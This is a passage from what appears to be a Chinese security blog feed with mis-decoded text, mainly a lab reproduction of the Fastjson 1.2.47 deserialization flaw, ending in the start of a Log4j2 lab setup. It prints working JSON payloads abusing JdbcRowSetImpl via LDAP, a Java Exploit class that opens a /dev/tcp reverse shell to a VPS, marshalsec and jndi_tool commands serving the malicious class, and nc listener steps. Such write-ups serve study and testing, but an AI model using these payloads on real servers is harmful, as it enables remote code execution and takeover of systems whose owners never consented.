HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)<br></pre></p></td></tr></tbody></table></figure><blockquote><p>Fastjsonç¯å¢ƒéƒ¨ç½²</p></blockquote><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre><span class="meta prompt_">$</span> fastjson-1.2.47ï¼ŒWeb ç¯å¢ƒæ–‡ä»¶ä¸‹è½½https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&shfl=shareset æå–ç : sven<p><span class="meta prompt_">$</span> å°†fastjson.waræ”¾ç½®ä»¥ä¸‹ç›®å½•<br>tomcat9&#x2F;bin</p><p><span class="meta prompt_">$</span> æˆäºˆtomcat9è¿™ä¸ªæ–‡ä»¶å¤¹777æƒé™<br>chmod -R 777 &#x2F;tomcat9<br></pre></p></td></tr></tbody></table></figure><blockquote><p>æ¼æ´ç¯å¢ƒå¯åŠ¨</p></blockquote><p>1ã€è¿›å…¥ tomcat&#x2F;bin ç›®å½•è¾“å…¥ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ç¯å¢ƒ</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./catalina.sh start</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/3.png" data-caption="image-20220831144348744"><img src="/../images/fastjson-1.2.47/3.png" alt="image-20220831144348744"></a></p><p>2ã€tomcatæœåŠ¡æ­£å¸¸</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/4.png" data-caption="image-20220829113214101"><img src="/../images/fastjson-1.2.47/4.png" alt="image-20220829113214101"></a></p><p>3ã€å‡ºç° Hello Wordï¼Œfastjson æ¼æ´ç¯å¢ƒæ­£å¸¸</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/5.png" data-caption="image-20220831144845976"><img src="/../images/fastjson-1.2.47/5.png" alt="image-20220831144845976"></a></p><hr><h2 id="0x02-æ¼æ´å¤ç°"><a href="#0x02-æ¼æ´å¤ç°" class="headerlink" title="0x02 æ¼æ´å¤ç°"></a>0x02 æ¼æ´å¤ç°</h2><blockquote><p>æ‰‹åŠ¨åå¼¹</p></blockquote><p>1ã€æ ¹æ®å‰é¢çš„ç¯å¢ƒéƒ¨ç½² JDK ä¸º 8u181ï¼Œæ‰€ä»¥ä½¿ç”¨ LDAP æ–¹å¼è¿›è¡Œæ¼æ´å¤ç°ï¼Œæœ¬æ¬¡å¤ç°å…·ä½“æ¼æ´ç¯å¢ƒä¸º</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>[+] apache-tomcat-9.0.27[+] fastsjon-1.2.47[+] jdk-8u181[+] ä¸¤å°çœŸå®VPSï¼Œä¸€å°æ­å»ºæ¼æ´ç¯å¢ƒï¼Œä¸€å°ç”¨äºåå¼¹shell[+] win10æ”»å‡»æœº</pre></td></tr></tbody></table></figure><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/6.png" data-caption="img"><img src="/../images/fastjson-1.2.47/6.png" alt="img"></a></p><center>ã€å›¾ä¸€ã€‘ RMI ä¸ LDAP å…·ä½“æ”¯æŒç‰ˆæœ¬çš„ JDK ç‰ˆæœ¬</center><br><p>2ã€LADP åå¼¹ shellï¼Œæµ‹è¯• fastjson æœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œ</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;xx&quot;,&quot;age&quot;:&quot;999&quot;&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/7.png" data-caption="image-20220831145323940"><img src="/../images/fastjson-1.2.47/7.png" alt="image-20220831145323940"></a></p><p>å“åº”æ­£å¸¸ï¼ŒfastsjonæœåŠ¡æ­£å¸¸</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/8.png" data-caption="image-20220831204721804"><img src="/../images/fastjson-1.2.47/8.png" alt="image-20220831204721804"></a></p><p>2ã€åˆ©ç”¨ DNSlog è¿›è¡Œæ¼æ´æ¢æµ‹, POC å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://dnslogåŸŸå&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/9.png" data-caption="image-20220831132648019"><img src="/../images/fastjson-1.2.47/9.png" alt="image-20220831132648019"></a></p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/10.png" data-caption="image-20220831132438496"><img src="/../images/fastjson-1.2.47/10.png" alt="image-20220831132438496"></a></p><p>3ã€åå¼¹shell</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/11.png" data-caption="image-20220831205912490"><img src="/../images/fastjson-1.2.47/11.png" alt="image-20220831205912490"></a></p><p>å°†ä»¥ä¸‹ä»£ç å‘½åä¸º Exploit.java ç¼–è¯‘ç”Ÿæˆ Exploit.class ,å¹¶å¼€å¯ Python ä¸´æ—¶ Web æœåŠ¡æ”¾ç½®æ¶æ„ç±»;ä»£ç ä¸­åå¼¹ shell ä¸­éœ€æ›´æ”¹ä¸ºè·å–åå¼¹ shell çš„ VPS åœ°å€ï¼Œ2333ä¸ºåç»­ nc ç›‘å¬çš„ç«¯å£ã€‚</p><div class="highlight-wrap" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/åå¼¹shellä¸»æœºIP/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/12.png" data-caption="image-20220831150537216"><img src="/../images/fastjson-1.2.47/12.png" alt="image-20220831150537216"></a></p><p>åˆ©ç”¨ marshalsec å¼€å¯ LDAP æœåŠ¡ï¼Œ2121ä¸º LDAP æœåŠ¡ç«¯å£ï¼Œ3333ä¸ºä¸Šä¸€æ­¥å¼€å¯çš„ python æœåŠ¡ç«¯å£</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://æ¶æ„class_IP:3333/#Exploit 2121</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/13.png" data-caption="image-20220831150758309"><img src="/../images/fastjson-1.2.47/13.png" alt="image-20220831150758309"></a></p><p>å¼€å¯ nc ç›‘å¬ï¼Œç­‰å¾…åå¼¹ shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/14.png" data-caption="image-20220831150855930"><img src="/../images/fastjson-1.2.47/14.png" alt="image-20220831150855930"></a></p><p>Burp æ”¾åŒ…ï¼Œå®ç°åå¼¹ shellï¼ŒPoc å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://åå¼¹shellä¸»æœºIP:2121/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/15.png" data-caption="image-20220831134702119"><img src="/../images/fastjson-1.2.47/15.png" alt="image-20220831134702119"></a></p><p>VPS æŸ¥çœ‹ï¼ŒæˆåŠŸåå¼¹</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/16.png" data-caption="image-20220831210528598"><img src="/../images/fastjson-1.2.47/16.png" alt="image-20220831210528598"></a></p><hr><h2 id="0x03-å…¶å®ƒæ–¹æ³•"><a href="#0x03-å…¶å®ƒæ–¹æ³•" class="headerlink" title="0x03 å…¶å®ƒæ–¹æ³•"></a>0x03 å…¶å®ƒæ–¹æ³•</h2><blockquote><p>åˆ©ç”¨ jndi_tool è·å–åå¼¹ shell</p></blockquote><p>1ã€å·¥å…·ä¸‹è½½é“¾æ¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wyzxxz/jndi_tool</span><br></pre></td></tr></table></figure></div><p>2ã€åå¼¹ shell å‘½ä»¤</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># è¯¦ç»†å‘½ä»¤</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer x.x.x.x 2121 &quot;bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/2333 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line"># å‘½ä»¤è§£é‡Š</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer æœ¬æœºIP LDAPæœåŠ¡ç›‘å¬ç«¯å£ &quot;bash=bash -i &gt;&amp;/dev/tcp/è·å–åå¼¹shellçš„VPS_IP/è·å–shellç›‘å¬ç«¯å£ 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/17.png" data-caption="image-20220831200418585"><img src="/../images/fastjson-1.2.47/17.png" alt="image-20220831200418585"></a></p><p>3ã€Burp æ”¾åŒ…æ‰§è¡Œå‘½ä»¤</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://x.x.x.x:2121/Object&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/18.png" data-caption="image-20220831200818338"><img src="/../images/fastjson-1.2.47/18.png" alt="image-20220831200818338"></a></p><p>4ã€æˆåŠŸè·å–åå¼¹ shell</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/19.png" data-caption="image-20220831201239796"><img src="/../images/fastjson-1.2.47/19.png" alt="image-20220831201239796"></a></p><p>5ã€å·¥å…·ä½œè€…æ•™ç¨‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ldap:</span><br><span class="line">1. å¯åŠ¨LDAPæœåŠ¡ï¼Œåé¢å†™è¦æ‰§è¡Œçš„è¯­å¥</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 &quot;curl dnslog.wyzxxz.cn&quot;</span><br><span class="line"></span><br><span class="line">2. å‘é€è¯·æ±‚åŒ…</span><br><span class="line">POST /test HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) </span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xx.xx.xx.xx:80/Object&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. æŸ¥çœ‹æ—¥å¿—æ˜¯å¦æ‰§è¡ŒæˆåŠŸ</span><br><span class="line"></span><br><span class="line">4ã€æ³¨ï¼šä½¿ç”¨å¸¸è§„åå¼¹shellæ— æ³•å®ç°åå¼¹ï¼Œä½œè€…åé¦ˆåå¼¹shellå‘½ä»¤ä¸ºï¼šbash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div><blockquote><p>Burp è¢«åŠ¨æ‰«ææ’ä»¶</p></blockquote><p>1ã€ä¸‹è½½åœ°å€</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pmiaowu/BurpFastJsonScan/releases/tag/BurpFastJsonScan-2.2.2</span><br></pre></td></tr></table></figure></div><p>2ã€å¯¼å…¥ Burp åï¼Œé‡åˆ° json è¯­å¥ä¼šè‡ªåŠ¨æ‰«æï¼Œå¼€å¯åå…³é—­ç»“æœå³å¯</p><h2 id="0x04-å‚è€ƒæ–‡ç« "><a href="#0x04-å‚è€ƒæ–‡ç« " class="headerlink" title="0x04 å‚è€ƒæ–‡ç« "></a>0x04 å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/hei-zi/p/13274272.html</span><br><span class="line">https://www.cnblogs.com/nul1/p/12747709.html</span><br><span class="line">http://arsenetang.com/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&amp;LDAP/</span><br><span class="line">https://github.com/safe6Sec/Fastjson</span><br></pre></td></tr></table></figure></div><h2 id="0x05-æœ¬æ–‡å·¥å…·"><a href="#0x05-æœ¬æ–‡å·¥å…·" class="headerlink" title="0x05 æœ¬æ–‡å·¥å…·"></a>0x05 æœ¬æ–‡å·¥å…·</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.zip</span><br><span class="line">https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz</span><br><span class="line">https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&amp;shfl=shareset æå–ç : sven</span><br><span class="line">marshalsec-0.0.3-SNAPSHOT-all.jar</span><br><span class="line">https://github.com/wyzxxz/jndi_tool</span><br><span class="line">https://github.com/pmiaowu/BurpFastJsonScan/releases/tag/BurpFastJsonScan-2.2.2</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
            <tag> æ¼æ´å¤ç° </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2æ¼æ´ç¯å¢ƒæ­å»ºåŠå¤ç°</title>
      <link href="/2022/09/02/Log4j2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/09/02/Log4j2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/log4j2/1.png" data-caption="image-20220901140741054"><img src="/../images/log4j2/1.png" alt="image-20220901140741054"></a></p><h2 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h2><p>1ã€æ¼æ´å½±å“ç‰ˆæœ¬</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log4j2.x&lt;=2.14.1</span><br></pre></td></tr></table></figure></div><h2 id="0x02-æ‰€éœ€ç¯å¢ƒ"><a href="#0x02-æ‰€éœ€ç¯å¢ƒ" class="headerlink" title="0x02 æ‰€éœ€ç¯å¢ƒ"></a>0x02 æ‰€éœ€ç¯å¢ƒ</h2><p>1ã€tomcatç‰ˆæœ¬8.0.51</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/tomcat/tomcat-8/</span><br></pre></td></tr></table></figure></div><p>2ã€tomcatæ—¥å¿—æ‰©å±•æ¥å£åŒ…</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat-juli.jar</span><br><span class="line">tomcat-juli-adapters.jar</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½åœ°å€</span><br><span class="line">http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.51/bin/extras/</span><br></pre></td></tr></table></figure></div><p>3ã€log4j2ç‰ˆæœ¬2.3</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log4j-core-2.3.jar</span><br><span class="line">log4j-api-2.3.jar</span><br><span class="line">log4j-1.2-api-2.3.jar</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½åœ°å€</span><br><span class="line">https://archive.apache.org/dist/logging/log4j/2.3/</span><br></pre></td></tr></table></figure></div><h2 id="0x03-ç¯å¢ƒæ­å»º"><a href="#0x03-ç¯å¢ƒæ­å»º" class="headerlink" title="0x03 ç¯å¢ƒæ­å»º"></a>0x03 ç¯å¢ƒæ­å»º</h2><blockquote><p>tomcatç¯å¢ƒæ­å»º</p></blockquote><p>è§ç«™å†…Fastjson-1.2.47æ¼æ´ç¯å¢ƒæ­å»ºåŠæ¼æ´å¤ç°æ–‡å­—ï¼Œæ­å»ºæ­¥éª¤ç›¸åŒ</p><blockquote><p>log4j2ç¯å¢ƒå¼•ç”¨</p></blockquote><p>1ã€æ–°å»ºLog4j2é…ç½®æ–‡ä»¶ï¼Œæ›´æ¢tomcaté»˜è®¤è¾“å‡ºç»„ä»¶ä¸ºdebugï¼Œç¡®ä¿å‚æ•°æ— å·®åˆ«è§¦å‘</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;Configuration status=<span class="string">&quot;debug&quot;</span>&gt;</span><br><span class="line">    &lt;Properties&gt;</span><br><span class="line">        &lt;Property name=<span class="string">&quot;logdir&quot;</span>&gt;$&#123;sys:catalina.base&#125;/logs&lt;/Property&gt;</span><br><span class="line">        &lt;Property name=<span class="string">&quot;layout&quot;</span>&gt;%d [%t] %-5p %c-%m%n&lt;/Property&gt;</span><br><span class="line">    &lt;/Properties&gt;</span><br><span class="line">    &lt;Appenders&gt;</span><br><span class="line">        &lt;Console name=<span class="string">&quot;CONSOLE&quot;</span> target=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span><br><span class="line">            &lt;PatternLayout charset=<span class="string">&quot;UTF-8&quot;</span> pattern=<span class="string">&quot;$&#123;layout&#125;&quot;</span> /&gt;</span><br><span class="line">        &lt;/Console&gt;</span><br><span class="line">        &lt;RollingFile name=<span class="string">&quot;CATALINA&quot;</span> fileName=<span class="string">&quot;$&#123;logdir&#125;/catalina.log&quot;</span></span><br><span class="line">            filePattern=<span class="string">&quot;$&#123;logdir&#125;/catalina.%d&#123;yyyy-MM-dd&#125;.log.gz&quot;</span>&gt;</span><br><span class="line">            &lt;PatternLayout charset=<span class="string">&quot;UTF-8&quot;</span> pattern=<span class="string">&quot;$&#123;layout&#125;&quot;</span> /&gt;</span><br><span class="line">            &lt;!-- DefaultRolloverStrategyå±æ€§å¦‚ä¸è®¾ç½®ï¼Œåˆ™é»˜è®¤ä¸ºæœ€å¤šåŒä¸€æ–‡ä»¶å¤¹ä¸‹<span class="number">7</span>ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œè®¾ç½®äº†<span class="number">20</span> --&gt;</span><br><span class="line">            &lt;SizeBasedTriggeringPolicy size=<span class="string">&quot;50MB&quot;</span> /&gt;</span><br><span class="line">            &lt;DefaultRolloverStrategy max=<span class="string">&quot;20&quot;</span> /&gt;</span><br><span class="line">        &lt;/RollingFile&gt;</span><br><span class="line">        &lt;RollingFile name=<span class="string">&quot;LOCALHOST&quot;</span> fileName=<span class="string">&quot;$&#123;logdir&#125;/localhost.log&quot;</span></span><br><span class="line">            filePattern=<span class="string">&quot;$&#123;logdir&#125;/localhost.%d&#123;yyyy-MM-dd&#125;-%i.log.gz&quot;</span>&gt;</span><br><span class="line">            &lt;PatternLayout charset=<span class="string">&quot;UTF-8&quot;</span> pattern=<span class="string">&quot;$&#123;layout&#125;&quot;</span> /&gt;</span><br><span class="line">            &lt;SizeBasedTriggeringPolicy size=<span class="string">&quot;50MB&quot;</span> /&gt;</span><br><span class="line">            &lt;DefaultRolloverStrategy max=<span class="string">&quot;20&quot;</span> /&gt;</span><br><span class="line">        &lt;/RollingFile&gt;</span><br><span class="line">    &lt;/Appenders&gt;</span><br><span class="line">    &lt;Loggers&gt;</span><br><span class="line">        &lt;Logger</span><br><span class="line">            name=<span class="string">&quot;org.apache.catalina.core.ContainerBase.[Catalina].[localhost]&quot;</span></span><br><span class="line">            level=<span 